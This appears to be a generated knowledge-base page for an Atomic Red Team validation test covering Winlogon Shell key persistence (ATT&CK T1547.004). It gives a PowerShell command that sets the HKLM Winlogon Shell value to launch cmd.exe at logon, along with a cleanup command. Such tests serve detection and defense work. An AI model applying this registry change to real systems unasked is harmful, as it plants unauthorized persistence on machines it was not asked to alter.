---
atomic_guid: "95a3c42f-8c88-4952-ad60-13b81d929a9d"
title: "Winlogon HKLM Shell Key Persistence - PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.004"
attack_technique_name: "Boot or Logon Autostart Execution: Winlogon Helper DLL"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "95a3c42f-8c88-4952-ad60-13b81d929a9d"
  - "Winlogon HKLM Shell Key Persistence - PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Winlogon HKLM Shell Key Persistence - PowerShell

PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

## Metadata

- Atomic GUID: 95a3c42f-8c88-4952-ad60-13b81d929a9d
- Technique: T1547.004: Boot or Logon Autostart Execution: Winlogon Helper DLL
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1547.004/T1547.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.004]]

## Input Arguments

### binary_to_execute

- description: Path of binary to execute
- type: path
- default: C:\Windows\System32\cmd.exe

## Executor

- name: powershell

### Command

```powershell
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
```

### Cleanup

```powershell
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.yaml)
